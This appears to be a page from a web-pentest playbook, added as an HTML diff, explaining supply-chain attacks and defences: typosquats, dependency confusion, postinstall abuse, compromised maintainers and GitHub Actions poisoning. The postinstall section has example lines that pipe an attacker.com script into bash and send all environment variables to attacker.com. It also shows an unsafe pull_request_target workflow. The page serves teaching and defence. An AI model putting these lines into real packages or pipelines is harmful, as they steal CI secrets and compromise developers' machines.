@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Supply-chain attack testing: typosquats, dependency confusion, postinstall script abuse, compromised maintainers, GitHub Actions / CI poisoning, and detection tooling.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff6633' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <script src="../domain-bar.js" defer></script>
+  <title>Supply-Chain Attacks · Web Pentest Playbook</title>
+</head>
+<body>
+
+<svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-package" viewBox="0 0 24 24"><line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></symbol>
+  </defs>
+</svg>
+
+<nav class="topnav" aria-label="Primary">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2026</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html#vulns" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="../days/day1.html" class="nav-link">Worksheets</a>
+    <a href="../report/index.html" class="nav-link">Report</a>
+  </div>
+  <div class="nav-right">
+    <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="nav-link" style="font-size:0.78rem;">GitHub</a>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle color theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="domain-bar" role="region" aria-label="Target domain bar">
+  <span class="domain-bar-label">🎯 Target</span><button type="button" class="bar-help-btn" title="Substitutes example.com / target.com / victim.com / myapp.com / legitimate.com (and prefixed forms like FUZZ.example.com) with your target. Skips emails, attacker domains, and chained subdomains." aria-label="What does this substitute?">?</button>
+  <input type="text" id="db-target" placeholder="acme.com or target.acme.com"
+         maxlength="253" autocomplete="off" inputmode="url"
+         aria-label="Target domain">
+  <button type="button" id="db-reset" title="Clear target and restore original snippets">↻ Reset</button>
+  <span class="domain-bar-status inactive" id="db-status" aria-live="polite">○ Inactive</span>
+</div>
+
+<div class="content-wrap" style="padding-top:2rem">
+  <div class="day-page-hero" style="--day-color: var(--danger)">
+    <div class="day-num">Vuln · Supply Chain</div>
+    <h1>📦 Supply-Chain Attacks</h1>
+    <p>Modern applications pull in hundreds of third-party packages, dozens of GitHub Actions, and a handful of base container images — each one a foothold the application owner does not control. Supply-chain attacks compromise the artifact <em>before</em> it ever reaches the developer's machine: a typosquat that gets installed during a late-night refactor, a maintainer's npm token leaked from a public repo, a postinstall script that runs the moment <code>npm install</code> fires. By the time a vulnerability hits production, the malicious code has already executed in CI, on every developer laptop, and in every customer's runtime. This page covers the five attack patterns you should test for and the tooling that catches them.</p>
+  </div>
+
+  <section class="worksheet-section" style="border-left: 3px solid var(--warn); background: color-mix(in srgb, var(--warn) 6%, transparent);">
+    <h2 style="color: var(--warn);">⚠ Scope &amp; ethics</h2>
+    <p>Most supply-chain testing during a pentest is read-only — auditing the target's installed dependency tree, lockfile, and CI workflow files. <strong>Do not</strong> publish proof-of-concept packages to npm / PyPI / Maven Central with names that resemble the target's internal packages, even with benign payloads — those package names live on those registries forever and become a real liability for someone else. Reproduce dependency-confusion findings inside an isolated registry mirror you control (Verdaccio, devpi). Action-poisoning PoCs likewise belong in a private fork, never against the public action. If you must demonstrate execution, use a dedicated victim repo and clearly tagged callbacks.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">1</span>🎭 Typosquatting</h2>
+    <p class="ws-intro">One typo and you install the attacker's package. The big language registries — npm, PyPI, RubyGems, Maven Central, Docker Hub, crates.io — all let anyone register any not-yet-claimed name. Most do not enforce confusable-name rules, do not require email confirmation for first publish, and (critically) run install-time scripts by default. A developer racing through a Friday-afternoon refactor types <code>npm install requets</code> instead of <code>requests</code>, hits enter, and an attacker now has code execution on their workstation.</p>
+
+    <p>The attacks land most often when a name is <em>almost</em> right: one transposed character (<code>lodahs</code> vs <code>lodash</code>), a missing letter (<code>requets</code>), an added one (<code>electorn</code>), a homoglyph (<code>reаct</code> with a Cyrillic <code>а</code>), or — peculiarly common when developers context-switch across ecosystems — a name that's correct in the wrong registry (<code>python-django</code> on PyPI when <code>django</code> is what you wanted, or <code>requests</code> typed into <code>npm install</code> when it's a Python package). Attackers monitor the npm registry's public new-packages feed, register confusable names against the top-1000 download list, and wait.</p>
+
+    <p>Real incidents to anchor the threat. The <code>event-stream</code> compromise in 2018 was technically maintainer transfer rather than typosquat, but it injected a Bitcoin-wallet stealer into a package depended on by 8 million weekly installs. <code>colors.js</code> and <code>faker.js</code> in early 2022 were sabotaged by their own maintainer with an infinite-loop denial-of-service — every CI in the world that pinned to a range tag broke overnight. The npm registry sees several typosquat takedowns every week; PyPI is similar. And the scoped-vs-unscoped confusion (<code>@types/express</code> vs <code>types-express</code>) is a special case: scoped names live in a per-org namespace nobody else can publish into, so attackers register the unscoped lookalike and wait for a careless install command.</p>
+
+    <pre class="snippet"><code># Look like the real thing — one character difference
+npm install lodahs        # not lodash
+npm install requets       # not requests (popular Python typo to npm)
+npm install electorn      # not electron
+pip install python-django # not django
+pip install crypt         # not crypto</code></pre>
+
+    <p>When you're auditing a target's lockfile, the question is the same one the attacker asks: does anything in here look <em>almost</em> like a more popular package? Pull the top dependencies, check publish age and download counts, and look at the maintainer history. A package with 12 weekly downloads, published two weeks ago, by an account with no other projects, is suspicious — especially if a 100M-download lookalike name is one Levenshtein distance away.</p>
+
+    <pre class="snippet"><code># Investigate before installing — first downloads, age, maintainer
+npm view lodash         # check the real one
+npm view lodahs         # likely shows: low downloads, recent publish, suspicious
+npm audit --omit=dev    # scan installed deps</code></pre>
+
+    <p><strong>Defenses that work:</strong> pin every dependency to an exact version (no <code>^</code> or <code>~</code> ranges) and check the lockfile (<code>package-lock.json</code>, <code>poetry.lock</code>, <code>Pipfile.lock</code>, <code>Gemfile.lock</code>, <code>go.sum</code>) into version control. Run <code>npm audit</code>, <code>pip-audit</code>, or an OSV-scanner job in CI on every PR. Front your registry with a private mirror (Verdaccio, JFrog Artifactory, AWS CodeArtifact) configured to only proxy an explicit allowlist of upstream packages — the moment a developer typos a name, the install fails fast instead of pulling a malicious lookalike. Pair that with developer education on the scoped-package convention.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">2</span>🪞 Dependency confusion</h2>
+    <p class="ws-intro">An internal package name accidentally claimed on a public registry. Discovered in 2021 by Alex Birsan (who used it to ring telephone-numbered bug bounties at Apple, Microsoft, PayPal, Tesla, Uber, and dozens more), this is the textbook supply-chain bug for any company that publishes private packages. Default package-manager resolution prefers the higher version number, and a public registry's <code>99.99.99</code> always beats a private registry's <code>1.4.2</code>.</p>
+
+    <p>The attacker's recon is dead simple. They scrape a leaked <code>package.json</code> from a public GitHub repo, a stack-trace dumped to a public log, an old NPM 404 error message, or a JS bundle served from the target's marketing site (which often inlines internal dependency names as part of webpack's chunk graph). They note that the company uses an internal package <code>acme-billing-utils</code>, find that name is unclaimed on public npm, register it, publish a version with version number <code>99.99.99</code>, add a <code>postinstall</code> that beacons home with the hostname and environment, and wait. The next time misconfigured CI runs <code>npm install</code> with <code>npm</code>'s default behavior of "fall back to public registry on miss," it pulls and executes the attacker's code with whatever credentials CI happens to hold.</p>
+
+    <pre class="snippet"><code>// Leaked package.json giveaway — internal package without scope
+{
+  "dependencies": {
+    "acme-billing-utils": "^1.2.3",      // &lt;-- attacker registers this on npm
+    "@acme/auth": "^2.0.0"               // scoped — much harder to hijack
+  }
+}</code></pre>
+
+    <p>The "highest version wins" rule is the kill shot. There is no security check; npm and pip do not verify that a private package and a public package with the same name are even from the same publisher. They just resolve to the higher SemVer.</p>
+
+    <pre class="snippet"><code># Attacker's registration on public npm
+npm publish acme-billing-utils  # version: 99.99.99 (highest wins)</code></pre>
+
+    <p>The vulnerable CI is the one that runs <code>npm install</code> (or <code>pip install -r requirements.txt</code>, or <code>mvn install</code>) without explicit registry configuration. The fix is to pin the registry to your internal mirror and refuse to fall back to the public registry for known-internal names — either in CI environment variables, a checked-in <code>.npmrc</code> / <code>pip.conf</code>, or a Verdaccio config that fails closed for unknown packages.</p>
+
+    <pre class="snippet"><code># Vulnerable CI config — pulls from public npm by default
+- run: npm install
+# Mitigation: use --registry or a .npmrc that points to internal mirror
+- run: npm install --registry=https://npm.acme.internal</code></pre>
+
+    <p>How to test for it on a real target. Identify candidate internal package names from anywhere they leak: the marketing-site JS bundle, public GitHub repos belonging to the org or its employees, expired or 404'd npm pages (the npm registry returns a different error for "never existed" vs "deleted"), and stack traces in public crash dumps. Cross-reference each candidate against npm / PyPI / Maven Central — anything unclaimed is a finding. Report it without publishing the squat.</p>
+
+    <p><strong>Defenses:</strong> use scoped packages (<code>@acme/billing-utils</code>) for everything internal — the <code>@acme</code> scope is owned by you on the public registry, so nobody else can publish into it. Run a private registry mirror with an allowlist of upstream packages, and make every developer / CI workflow point at it via a checked-in <code>.npmrc</code>. Use <code>npm install --strict-peer-deps</code> and <code>--ignore-scripts</code> in CI. Maintain separate dev / prod registries with stricter rules on prod. Tools like <code>dependency-check</code>, Snyk, and Socket.dev's npm package both flag dependency-confusion candidates automatically when added to CI.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">3</span>⚙ Postinstall script abuse</h2>
+    <p class="ws-intro">npm runs <code>scripts.postinstall</code> automatically as part of <code>npm install</code>. Same for <code>preinstall</code>, <code>install</code>, <code>prepare</code>, <code>preuninstall</code>, and a handful of others. PyPI does the equivalent through <code>setup.py</code> running on install, and Ruby's <code>Gem::Specification</code> does it through <code>extconf.rb</code> hooks. The result: every <code>npm install</code> against a fresh tree is implicit code execution from every transitive dependency in the tree. Cryptomining, environment-variable exfil, persistence on the developer's laptop, and SSH-key theft are all just one <code>postinstall</code> field away — and they happen <em>before</em> any of your security tooling has a chance to scan the code.</p>
+
+    <pre class="snippet"><code>// Malicious package.json
+{
+  "name": "useful-utility",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -fsSL https://attacker.com/install.sh | bash"
+  }
+}</code></pre>
+
+    <p>The most common payload, by a wide margin, is environment-variable exfil. Why? Because in CI the environment is full of secrets — AWS keys, GitHub tokens, npm publish tokens, Datadog API keys, Slack webhooks, signing keys, deploy SSH keys. A two-line beacon dumps the lot back to the attacker, who then has cloud-account access without ever needing to escalate locally:</p>
+
+    <pre class="snippet"><code># Exfil env vars (commonly contain CI secrets, AWS keys, GitHub tokens)
+node -e "require('https').request('https://attacker.com/?d='+Buffer.from(JSON.stringify(process.env)).toString('base64')).end()"</code></pre>
+
+    <p>The defense is to disable lifecycle scripts at install time and only re-enable them for the small set of packages you've explicitly vetted (typically native-extension builds like <code>node-sass</code>, <code>sharp</code>, or <code>better-sqlite3</code>). The <code>--ignore-scripts</code> flag does this per invocation; setting it in <code>~/.npmrc</code> or a project-level <code>.npmrc</code> makes it the default for everyone. Pip's equivalent is preferring wheels and pinning hashes — when you only install pre-built wheels, the <code>setup.py</code> never runs:</p>
+
+    <pre class="snippet"><code># Defense: install without running scripts
+npm install --ignore-scripts                    # global default
+pip install --no-binary :all: --require-hashes  # py equivalent
+
+# Or set globally in ~/.npmrc
+echo "ignore-scripts=true" >> ~/.npmrc</code></pre>
+
+    <p>There is a real cost: <code>--ignore-scripts</code> breaks packages that do legitimate native-module compilation in their lifecycle hooks (<code>node-sass</code>, <code>sharp</code>, <code>node-gyp</code>-based modules generally). The right pattern is to opt those packages back in by name — either by running their build step manually, or by maintaining an allowlist with <code>@lavamoat/allow-scripts</code> (which only runs scripts for packages you've explicitly approved). The friction of "I added a new dep with a postinstall, do I trust this one?" is the entire point — it surfaces a question that should always be asked.</p>
+
+    <p>What to look for during a pentest. If you have access to the target's lockfile, run <code>find node_modules -name package.json -exec jq -r 'select(.scripts.postinstall) | .name + ": " + .scripts.postinstall' {} \;</code> (or the equivalent for the target ecosystem) and read every result by hand. Anything that fetches a remote URL, decodes base64, or invokes <code>node -e</code> / <code>python -c</code> is a finding regardless of intent.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">4</span>👤 Compromised maintainer / signed-but-malicious releases</h2>
+    <p class="ws-intro">A single compromised npm or PyPI account ships malicious code to billions of installs. The package is "legitimate" — same name, same maintainer in the registry's eyes, same signing key (the attacker stole or reset the credentials) — and the malicious release is signed by an authentic publisher. Defense-in-depth here means assuming any single account can be lost and structuring the system so that one account's compromise is recoverable.</p>
+
+    <p>The history is sobering. <code>event-stream</code> (2018): the original maintainer transferred ownership to a stranger who'd "offered to help"; the stranger added a dependency that targeted a single downstream Bitcoin-wallet library and stole keys for a year before being noticed. <code>coa</code> and <code>rc</code> (2021): two separate npm maintainer-credential resets in the same week, both carrying the same crypto-mining payload. <code>node-ipc</code> (2022): the maintainer himself, in protest of the war in Ukraine, added a "protestware" payload that wiped files on hosts geolocated to Russia or Belarus — depended on by <code>vue-cli</code> and millions of installs. <code>ua-parser-js</code> (2021): account compromise; pushed a crypto miner and credential stealer; affected packages with hundreds of millions of weekly downloads. <code>colors.js</code> and <code>faker.js</code> (2022): maintainer self-sabotage with an infinite loop; broke CI everywhere overnight.</p>
+
+    <p>Two questions matter when triaging an incident or auditing a tree. First: is this version on a published advisory? Vulnerability scanners pull from OSV, GitHub Advisory Database, npm's own <code>npm audit</code> backend, and PyPI's safety-db, so a quick local audit catches anything publicly disclosed:</p>
+
+    <pre class="snippet"><code># Audit installed packages for known compromises
+npm audit
+pip-audit
+trivy fs ./node_modules
+osv-scanner --recursive .</code></pre>
+
+    <p>Second: who actually maintains this package, and is anything weird about the publish history? An account with two maintainers is harder to compromise than an account with one; a publish history with a four-year gap followed by three releases in the last week is a screaming red flag. Both are quick to check from the registry directly:</p>
+
+    <pre class="snippet"><code># Check who maintains a package + their other packages
+npm view some-package maintainers
+npm view some-package time   # publish history; sudden recent versions are suspicious</code></pre>
+
+    <p>Also check: does the package use signed releases? npm provenance (rolled out broadly in 2023) lets a publisher cryptographically attest "this tarball was built by GitHub Actions on commit SHA <code>...</code> in repo <code>...</code>"; PyPI Trusted Publishing (also OIDC-based) gives the same guarantee. A package with provenance pointing to a public, reproducible build is harder to silently subvert than one pushed from a maintainer's laptop with a long-lived API token.</p>
+
+    <p><strong>Defenses:</strong> pin every dependency to an exact version (lockfile in version control). Require multi-factor auth on all maintainer accounts of packages you publish. Adopt npm provenance / PyPI Trusted Publishing for your own releases. Verify upstream packages' Sigstore signatures (<code>cosign verify</code>) where available. Run Renovate or Dependabot, but turn auto-merge OFF for any major-version bump or any change to a package not in your reviewed-by-a-human allowlist. Keep an incident-response runbook for "an upstream we depend on just got compromised" — rotation order for affected secrets, what to roll back to, who to notify.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">5</span>🔁 GitHub Actions / CI poisoning</h2>
+    <p class="ws-intro">CI is the new high-value target. The build system has the credentials to push to npm, deploy to AWS, sign release artifacts, and publish to package registries — secrets a single compromised CI step can exfiltrate or use directly. And because <code>uses:</code> references in GitHub Actions workflows are typically tag-based, a maintainer who can mutate the tag (or compromise the repo to force-push a new SHA at the same tag) ships malicious bytecode to every consumer's next run.</p>
+
+    <p>Recent incidents to anchor the threat. <code>tj-actions/changed-files</code> (March 2025): the maintainer's PAT was compromised; the attacker pushed a build that scraped CI runner memory for secrets and exfiltrated them via DNS — depended on by tens of thousands of repos worldwide. <code>reviewdog/action-setup</code> (early 2025): similar pattern, supply-chain push to a popular community action.</p>
+
+    <p>The fix is structural: stop trusting tags. A tag like <code>@v44</code> is a moving pointer — the maintainer can update it, and (more importantly) anyone who compromises the maintainer can update it. A commit SHA is content-addressed; the only way to change what <code>@a284dc18...</code> resolves to is to break SHA-1, which nobody can yet do for an arbitrary collision. Pin every <code>uses:</code> to a 40-character SHA, and use Dependabot's GitHub Actions ecosystem support to receive PRs when a new SHA is published — review them, then merge.</p>
+
+    <pre class="snippet"><code># DON'T: tag references can be silently mutated
+- uses: tj-actions/changed-files@v44
+
+# DO: pin to commit SHA
+- uses: tj-actions/changed-files@a284dc1814e3fe07e2362b86d8a9e26d9e5bd0b6</code></pre>
+
+    <p>The single most dangerous primitive in GitHub Actions is <code>pull_request_target</code>. Unlike <code>pull_request</code>, this trigger runs in the context of the <em>base</em> branch with full access to repository secrets — even when the PR comes from a fork. The intent is to let trusted automation comment on PRs, label them, etc., without giving fork PRs access to secrets. The footgun is that if you also <code>checkout</code> the PR's head SHA and run any code from it (including <code>npm install</code>, which runs <code>postinstall</code> scripts from the PR's <code>package.json</code>), you've handed every drive-by fork-PR opener your AWS keys.</p>
+
+    <pre class="snippet"><code># DANGEROUS: pull_request_target gives the PR access to repo secrets
+on:
+  pull_request_target:    # &lt;-- runs in trusted context with secrets
+    types: [opened, synchronize]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # checks out PR code WITH secrets available
+      - run: npm install &amp;&amp; npm test                       # PR's package.json scripts run with secrets</code></pre>
+
+    <p>The right pattern is the <code>pull_request</code> + <code>workflow_run</code> split. The first workflow runs on <code>pull_request</code> in the untrusted, no-secrets context — it can run tests against the PR code without leaking anything. The second workflow triggers on the first one's completion (<code>workflow_run</code>) and runs in the trusted context with secrets available, but it never executes PR-controlled code. It only consumes safe outputs (test results, artifact metadata) and posts a comment / deploys / signs a build:</p>
+
+    <pre class="snippet"><code># Mitigation: split into 2 workflows
+# 1. Untrusted: runs PR code, NO secrets
+on: pull_request
+# 2. Trusted: only deploys after manual approval, with secrets
+on:
+  workflow_run:
+    workflows: ["Untrusted PR"]
+    types: [completed]</code></pre>
+
+    <p><strong>Defenses:</strong> pin every <code>uses:</code> to a 40-character commit SHA. Never combine <code>pull_request_target</code> with checkout of the PR's head. Minimize Actions secrets — most workflows do not need <code>AWS_SECRET_ACCESS_KEY</code> at all; use OIDC (<code>permissions: id-token: write</code> + <code>aws-actions/configure-aws-credentials</code>) for short-lived, just-in-time cloud auth instead. Require code review on changes to <code>.github/workflows/*</code>. Enable branch protection that requires a CODEOWNERS-approving review for workflow file changes. Audit installed Actions periodically with a tool like <code>action-validator</code> or Stacklok's <code>frizbee</code>.</p>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">6</span>🧰 Detection / mitigation tools</h2>
+    <p class="ws-intro">Good supply-chain posture is a stack of small tools, each catching a different layer. None individually is a silver bullet; together they catch most of the realistic threat model. The list below is the set worth knowing by name during an engagement — they all have free tiers and integrate into CI in well-documented ways.</p>
+    <ul>
+      <li><strong>Syft</strong> — SBOM (Software Bill of Materials) generator from container images, filesystems, and lockfiles. The output feeds every other tool on this list. <a href="https://github.com/anchore/syft" target="_blank" rel="noopener noreferrer">github.com/anchore/syft</a></li>
+      <li><strong>Grype</strong> / <strong>Trivy</strong> — vulnerability scanners that consume SBOMs (or scan directly) and flag known-vulnerable versions against OSV / NVD / GHSA databases. Trivy also scans Dockerfiles and Kubernetes manifests; both run as a single-binary CI step.</li>
+      <li><strong>Sigstore / cosign</strong> — verify cryptographic signatures on release artifacts. The pattern is "publish with <code>cosign sign-blob</code>, verify with <code>cosign verify-blob</code>"; ties an artifact to a specific OIDC identity (e.g. a GitHub Actions workflow at a specific SHA). <a href="https://www.sigstore.dev/" target="_blank" rel="noopener noreferrer">sigstore.dev</a></li>
+      <li><strong>npm provenance</strong> — opt-in provenance metadata published alongside npm packages when the publish runs from GitHub Actions. <code>npm publish --provenance</code> in a workflow records the commit SHA, workflow file, and runner identity. Verifiable via <code>npm audit signatures</code>.</li>
+      <li><strong>PyPI Trusted Publishing</strong> — OIDC-based publish flow for PyPI. Replaces long-lived API tokens with short-lived per-workflow credentials; eliminates the "maintainer's <code>~/.pypirc</code> got stolen" failure mode entirely.</li>
+      <li><strong>Socket.dev</strong> — npm / PyPI / Go / Maven risk-scoring. Flags suspicious behavior (postinstall scripts, network calls, filesystem access, eval usage, typo distance to popular packages) at PR-review time before a dep gets merged. Free for open source.</li>
+      <li><strong>Snyk Open Source</strong> / <strong>GitHub Advanced Security</strong> — paid commercial scanners; broader rule sets than the free tools and tighter integrations with PR workflows. Worth it for teams that ship customer software.</li>
+      <li><strong>Renovate</strong> / <strong>Dependabot</strong> — automated dependency-update PRs. Configure <code>automerge: false</code> for non-trivial bumps, <code>automerge: true</code> only for patch-level updates of pre-vetted packages. Without a human in the loop, these become a supply-chain accelerant rather than a defense.</li>
+      <li><strong>OSV-scanner</strong> — Google's open-source universal vuln scanner. Single binary, multi-ecosystem (npm, pip, Go, Maven, Cargo, etc.), cross-references the OSV database. <a href="https://google.github.io/osv-scanner/" target="_blank" rel="noopener noreferrer">google.github.io/osv-scanner</a></li>
+      <li><strong>gitleaks</strong> / <strong>truffleHog</strong> — pre-publish secret scanners. Catch the case where a developer accidentally bundles a <code>.env</code> file into an npm package or commits a private key to a public repo. Worth running both in pre-commit hooks and in CI.</li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section">
+    <h2><span class="ws-section-num">7</span>📚 References</h2>
+    <ul>
+      <li><a href="https://owasp.org/www-project-software-component-verification-standard/" target="_blank" rel="noopener noreferrer">OWASP Software Component Verification Standard (SCVS)</a> — the canonical maturity model for component-supply-chain security; useful framing for engagement reports.</li>
+      <li><a href="https://theupdateframework.io/" target="_blank" rel="noopener noreferrer">The Update Framework (TUF)</a> — academic-grade design for secure software-update systems; the reference architecture cosign / Sigstore / PyPI's signing all draw from.</li>
+      <li><a href="https://slsa.dev/" target="_blank" rel="noopener noreferrer">SLSA framework</a> — Supply-chain Levels for Software Artifacts; Google-led specification for build-provenance maturity (Levels 1–4). The vocabulary most modern enterprise supply-chain programs use.</li>
+      <li><a href="https://docs.npmjs.com/generating-provenance-statements" target="_blank" rel="noopener noreferrer">npm provenance docs</a> — the canonical how-to for publishing signed npm packages from GitHub Actions.</li>
+      <li><a href="https://arxiv.org/abs/2005.09535" target="_blank" rel="noopener noreferrer">Backstabber's Knife Collection (Ohm et al., 2020)</a> — academic survey of 174 malicious npm / PyPI / RubyGems packages; the empirical foundation for "what attackers actually do" in this space.</li>
+    </ul>
+  </section>
+
+</div>
+
+<script>
+  (function(){
+    var t = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+    var btn = document.getElementById('theme-toggle');
+    if(btn){
+      btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+      btn.addEventListener('click', function(){
+        var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', n);
+        localStorage.setItem('theme', n);
+        btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
